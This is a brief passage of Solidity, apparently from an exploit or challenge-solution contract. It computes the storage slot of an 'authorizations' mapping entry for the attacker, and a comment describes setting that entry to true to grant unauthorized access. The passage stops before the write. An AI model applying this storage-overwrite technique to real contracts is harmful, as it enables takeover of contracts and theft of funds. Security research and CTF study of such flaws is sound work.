        // To get storage slot for authorizations[attacker]:
        // slot = keccak256(abi.encode(attacker, uint256(1)))
        bytes32 slot = keccak256(abi.encode(address(this), uint256(1)));

        // Set authorizations[attacker] = true (bool true = bytes32(uint256(1)))
